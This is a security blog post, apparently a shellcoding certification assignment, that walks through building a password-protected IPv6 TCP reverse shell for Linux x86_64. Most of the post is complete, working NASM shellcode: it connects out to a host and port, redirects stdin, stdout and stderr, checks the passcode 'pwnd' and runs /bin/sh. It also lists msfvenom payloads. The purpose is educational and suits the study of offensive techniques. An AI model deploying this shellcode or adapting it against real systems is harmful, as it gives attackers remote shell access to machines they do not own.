---
layout: single
title:  Password Protected TCP Reverse Shell (IPv6) - Linux x86_64
date: 2018-7-17
classes: wide
header:
  teaser: /assets/images/Password_Protected_TCP_Reverse_Shell_(IPv6)_Linux_x86_64/ReverseShellDemo.gif
---

Introduction
------------
In this post we will create a custom TCP reverse shell for Linux x86_64 architecture that requires password to spawn a shell. This post is a continuation of [Password Protected Tcp Bind Shell ~ Linux X86_64](https://ihack4falafel.github.io/Password-Protected-TCP-Bind-Shell-~-Linux-x86_64/) and since my previous posts include an in-depth analysis of the functions used in reverse shells we won’t spend too much time there.

Shellcode
---------
I've decided to create an IPv6 reverse shell this time around for two reasons, the first being I haven’t done any before and the second is for some reason `msfvenom` don’t have one for x86_64 so the final shellcode might be of use to somebody, maybe.

```sh
➜  ~ msfvenom -l payloads | grep linux/x64
    linux/x64/exec                                      Execute an arbitrary command
    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection
    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker
    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
    linux/x64/shell_find_port                           Spawn a shell on an established connection
    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
➜  ~ 
```

Creating an IPv6 reverse shell is not rocket science, all we need is use `AF_INET6` as domain when calling `socket()` function and use IPv6 structure to specify what IP and port we want amongst other things (I used localhost `::1` in this case). Lastly, we need to accommodate for the structure length when calling `connect()` function using `RDX` register.

```c
Address format
           struct sockaddr_in6 {
               sa_family_t     sin6_family;   /* AF_INET6 */
               in_port_t       sin6_port;     /* port number */
               uint32_t        sin6_flowinfo; /* IPv6 flow information */
               struct in6_addr sin6_addr;     /* IPv6 address */
               uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
           };

           struct in6_addr {
               unsigned char   s6_addr[16];   /* IPv6 address */
           };
```

The following is the final null-free shellcode. Please refer to the link of my previous post in the introduction section to learn more about `read()` function used in the password check routine.

```nasm
section .text

global _start

_start:

	; int socket(int domain, int type, int protocol)
	; rax=41, rdi=10, rsi=1, rdx=0
	xor esi,esi
	mul esi                
	inc esi
	push 10 
	pop rdi
	add al, 41
	syscall

	; save socket fd in rdi
	xchg rbx,rax

	; struct sockaddr_in6 struct
	push rdx			            ; scope id = 0
	mov rcx,0xFEFFFFFFFFFFFFFF      ; link local address ::1
	not rcx
	push rcx
	push rdx
	push rdx                        ; sin6_flowinfo=0
	push word 0x3905		        ; port 1337
	push word 10     		        ; sin6_family

	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
	; rax=42, rdi=rbx(fd), rsi=sockaddr_inet6, rdx=28 (length)
	push 	rbx
	pop 	rdi
	push 	rsp
	pop 	rsi
	push 	28
	pop 	rdx
	push 	42
	pop 	rax
	syscall

	; dup2 (new, old)
	; rax=33, rdi=new fd, rsi=0,1,2 (stdin, stdout, stderr)
	xchg   rsi, rax
	push 0x3
	pop rsi
_loop:
	push 0x21
	pop rax
	dec esi
	syscall
	loopnz _loop

	; read (int fd, void *bf, size_t count)
	; rax=0, rdi=0 (stdin), rsi=rsp, rdx=4 (pwnd)
	xor rax, rax
	push rax
	pop rdi
	push rax
	push rsp
	pop rsi
	push 0x4
	pop rdx
	syscall

	; check passcode (pwnd)
	push 0x646e7770
	pop rbx
	cmp dword [rsi], ebx
	jne _nop

	; int execve(cont char *filename, char *const argv[], char *const envp[])
	; rax=59, rdi=/bin//sh, rsi=0, rdx=0
	xor rax, rax
	push rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	push rax
	push rsp
	pop rsi
	cdq
	push 0x3b
	pop rax
	syscall

_nop:
	nop
```

Now its demo time.

![](/assets/images/Password_Protected_TCP_Reverse_Shell_(IPv6)_Linux_x86_64/ReverseShellDemo.gif)

Closing Thoughts
----------------
I did learn a thing or two about IPv6 addressing while crafting this shellcode and I hope you did too. All of the above code are available on my [github](https://github.com/ihack4falafel/SLAE64/tree/master/Assignment%202) or [exploit-db](https://www.exploit-db.com/exploits/45039). Feel free to contact me for questions via Twitter [@ihack4falafel](https://twitter.com/ihack4falafel).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certiﬁcation:

[http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html)

Student ID: SLAE64–1579
